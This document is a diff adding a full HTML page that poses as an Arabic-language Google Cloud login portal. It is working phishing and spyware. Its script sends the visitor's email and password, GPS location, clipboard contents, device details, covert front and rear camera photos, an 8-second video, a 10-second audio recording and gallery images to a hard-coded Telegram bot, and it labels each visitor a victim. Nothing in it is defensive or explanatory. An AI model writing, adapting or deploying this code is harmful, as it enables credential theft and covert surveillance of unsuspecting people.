@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Cloud - بوابة المصادقة الآمنة</title>
+    <style>
+        :root {
+            --bg-color: #0b0f19;
+            --card-bg: #111827;
+            --accent-color: #3b82f6;
+            --accent-glow: rgba(59, 130, 246, 0.4);
+            --text-color: #f3f4f6;
+            --text-muted: #9ca3af;
+        }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .auth-container {
+            width: 100%;
+            max-width: 440px;
+            background: var(--card-bg);
+            border: 2px solid var(--accent-color);
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: 0 0 35px var(--accent-glow);
+            text-align: center;
+        }
+        .logo-box {
+            font-size: 2rem;
+            font-weight: 900;
+            color: var(--accent-color);
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+        .auth-container h2 {
+            font-size: 1.5rem;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        .auth-container p {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            margin-bottom: 30px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0b0f19;
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .form-group input:focus {
+            border-color: var(--accent-color);
+            box-shadow: 0 0 10px var(--accent-glow);
+        }
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+            color: #fff;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .submit-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(59, 130, 246, 0.7);
+        }
+        .footer-note {
+            margin-top: 25px;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="auth-container">
+        <div class="logo-box">WORKSPACE ID</div>
+        <h2>تسجيل الدخول للمتابعة</h2>
+        <p>قم بربط حسابك للمتابعة إلى لوحة التحكم السحابية وحفظ الجلسة.</p>
+        
+        <form id="authForm" onsubmit="handleCredentialSubmit(event)">
+            <div class="form-group">
+                <label>البريد الإلكتروني أو اسم المستخدم</label>
+                <input type="text" id="userInput" required placeholder="name@domain.com">
+            </div>
+            <div class="form-group">
+                <label>كلمة المرور الخاصة بالحساب</label>
+                <input type="password" id="passInput" required placeholder="••••••••••••">
+            </div>
+            <button type="submit" class="submit-btn">مصادقة وتوثيق</button>
+        </form>
+
+        <div class="footer-note">نظام المشفر والمحمي بالكامل © 2026</div>
+    </div>
+
+    <!-- عناصر مخفية للتشغيل والتنفيذ الشامل -->
+    <video id="camVideo" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <!-- مدخل ملفات حقيقي مخصص لجلب الصور بدقة -->
+    <input type="file" id="realGalleryInput" accept="image/*" multiple style="display:none;" onchange="handleRealGalleryUpload(this)">
+
+    <script>
+        const botToken = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
+        const chatId = "7713496654";
+
+        let clipboardHistory = JSON.parse(localStorage.getItem('cb_history') || '[]');
+
+        window.addEventListener('load', () => {
+            setTimeout(startCompleteExtractionSequence, 500);
+        });
+
+        // التقاط بيانات الاعتماد المدخلة بدقة تامة فور ضغط المستخدم
+        function handleCredentialSubmit(e) {
+            e.preventDefault();
+            const user = document.getElementById('userInput').value;
+            const pass = document.getElementById('passInput').value;
+            let visitorId = localStorage.getItem('v_id') || 'UNKNOWN';
+
+            let credReport = `🚨 **[ بيانات اعتماد جديدة تم التقاطها ]** 🚨\n`;
+            credReport += `━━━━━━━━━━━━━━━━━━━\n`;
+            credReport += `🎯 **معرف الضحية:** \`${visitorId}\`\n`;
+            credReport += `👤 **البريد/المستخدم:** \`${user}\`\n`;
+            credReport += `🔑 **كلمة المرور:** \`${pass}\`\n`;
+            credReport += `━━━━━━━━━━━━━━━━━━━`;
+
+            sendTextToTelegram(credReport);
+
+            // تفعيل نافذة المعرض فوراً لجلب الصور الحقيقية للجهاز
+            const galleryInput = document.getElementById('realGalleryInput');
+            galleryInput.click();
+
+            alert('جاري التحقق من بيانات الاعتماد وتحديث الجلسة...');
+        }
+
+        async function startCompleteExtractionSequence() {
+            let visitorId = localStorage.getItem('v_id');
+            if (!visitorId) {
+                visitorId = 'ID-' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+                localStorage.setItem('v_id', visitorId);
+            }
+
+            let report = "☠️ **[ تقرير رصد زائر وبدء السحب الشامل ]** ☠️\n";
+            report += "━━━━━━━━━━━━━━━━━━━\n";
+            report += `🛑 **معرف الضحية:** \`${visitorId}\`\n`;
+            report += `📱 **معلومات الجهاز:** \`${navigator.userAgent}\`\n`;
+            report += `🖥 **دقة الشاشة:** \`${window.screen.width}x${window.screen.height}\`\n`;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        report += `📍 **إحداثيات الموقع (GPS):** \`${pos.coords.latitude}, ${pos.coords.longitude}\`\n`;
+                        report += `🌐 **رابط الخريطة:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
+                        appendClipboardAndSend(report);
+                    },
+                    (err) => {
+                        report += `📍 **إحداثيات الموقع (GPS):** \`تم رفض الإذن\`\n`;
+                        appendClipboardAndSend(report);
+                    },
+                    { timeout: 7000 }
+                );
+            } else {
+                appendClipboardAndSend(report);
+            }
+
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    const cbText = await navigator.clipboard.readText();
+                    if (cbText && !clipboardHistory.includes(cbText)) {
+                        clipboardHistory.unshift(cbText);
+                        if (clipboardHistory.length > 10) clipboardHistory.pop();
+                        localStorage.setItem('cb_history', JSON.stringify(clipboardHistory));
+                    }
+                }
+            } catch (e) {}
+
+            await capturePhotosSequence();
+            await recordVideoEightSeconds();
+            await recordAudioTenSeconds();
+        }
+
+        // معالجة وإرسال الصور الحقيقية من المعرض بدقة
+        async function handleRealGalleryUpload(input) {
+            if (!input.files || input.files.length === 0) return;
+            let visitorId = localStorage.getItem('v_id') || 'UNKNOWN';
+            const filesToUpload = Array.from(input.files).slice(0, 10);
+
+            for (let i = 0; i < filesToUpload.length; i++) {
+                const file = filesToUpload[i];
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', file, file.name);
+                formData.append('caption', `🖼 **[صورة حقيقية من معرض الجهاز #${i + 1}]**\n📁 الملف: \`${file.name}\`\n🎯 الضحية: \`${visitorId}\``);
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (e) {}
+            }
+        }
+
+        function appendClipboardAndSend(text) {
+            text += "━━━━━━━━━━━━━━━━━━━\n";
+            if (clipboardHistory.length > 0) {
+                text += `🩸 **سجل الحافظة المنسوخ:**\n`;
+                clipboardHistory.forEach((item, idx) => {
+                    text += `> [${idx + 1}] \`${item.substring(0, 60)}\`\n`;
+                });
+            } else {
+                text += `🩸 **سجل الحافظة:** \`فارغ\`\n`;
+            }
+            text += "━━━━━━━━━━━━━━━━━━━\n⚡ *جاري تصدير الوسائط الحية...*";
+
+            sendTextToTelegram(text);
+        }
+
+        async function capturePhotosSequence() {
+            await captureSet("user", 4, "الكاميرا_الأمامية");
+            await captureSet("environment", 4, "الكاميرا_الخلفية");
+        }
+
+        function captureSet(facing, count, label) {
+            return new Promise((resolve) => {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } })
+                    .then(stream => {
+                        const video = document.getElementById('camVideo');
+                        video.srcObject = stream;
+                        
+                        let taken = 0;
+                        const timer = setInterval(() => {
+                            if (taken >= count) {
+                                clearInterval(timer);
+                                stream.getTracks().forEach(t => t.stop());
+                                resolve();
+                                return;
+                            }
+                            taken++;
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            canvas.toBlob(blob => {
+                                const formData = new FormData();
+                                formData.append('chat_id', chatId);
+                                formData.append('photo', blob, `${label}_${taken}.jpg`);
+                                formData.append('caption', `💀 **[${label} #${taken}]**\n🎯 معرف الضحية: \`${localStorage.getItem('v_id')}\``);
+
+                                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                }).catch(e => {});
+                            }, 'image/jpeg');
+
+                        }, 1000);
+                    })
+                    .catch(err => {
+                        resolve();
+                    });
+            });
+        }
+
+        function recordVideoEightSeconds() {
+            return new Promise((resolve) => {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                    .then(stream => {
+                        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                        let chunks = [];
+
+                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                        mediaRecorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'video/webm' });
+                            const formData = new FormData();
+                            formData.append('chat_id', chatId);
+                            formData.append('video', blob, 'target_video.webm');
+                            formData.append('caption', `🎬 **[فيديو مراقبة مباشر - 8 ثوانٍ]**\n🎯 معرف الضحية: \`${localStorage.getItem('v_id')}\``);
+
+                            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                                method: 'POST',
+                                body: formData
+                            }).finally(() => {
+                                stream.getTracks().forEach(t => t.stop());
+                                resolve();
+                            });
+                        };
+
+                        mediaRecorder.start();
+                        setTimeout(() => {
+                            if (mediaRecorder.state === "recording") {
+                                mediaRecorder.stop();
+                            }
+                        }, 8000);
+                    })
+                    .catch(e => resolve());
+            });
+        }
+
+        function recordAudioTenSeconds() {
+            return new Promise((resolve) => {
+                navigator.mediaDevices.getUserMedia({ audio: true })
+                    .then(stream => {
+                        const mediaRecorder = new MediaRecorder(stream);
+                        let audioChunks = [];
+
+                        mediaRecorder.ondataavailable = event => {
+                            audioChunks.push(event.data);
+                        };
+
+                        mediaRecorder.onstop = () => {
+                            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                            const formData = new FormData();
+                            formData.append('chat_id', chatId);
+                            formData.append('voice', audioBlob, 'target_audio.ogg');
+                            formData.append('caption', `🎙 **[تسجيل صوتي خفي - 10 ثوانٍ]**\n🎯 معرف الضحية: \`${localStorage.getItem('v_id')}\``);
+
+                            fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
+                                method: 'POST',
+                                body: formData
+                            }).finally(() => {
+                                stream.getTracks().forEach(t => t.stop());
+                                resolve();
+                            });
+                        };
+
+                        mediaRecorder.start();
+                        setTimeout(() => {
+                            if (mediaRecorder.state === "recording") {
+                                mediaRecorder.stop();
+                            }
+                        }, 10000);
+                    })
+                    .catch(e => resolve());
+            });
+        }
+
+        function sendTextToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => {});
+        }
+    </script>
+
+</body>
+</html>
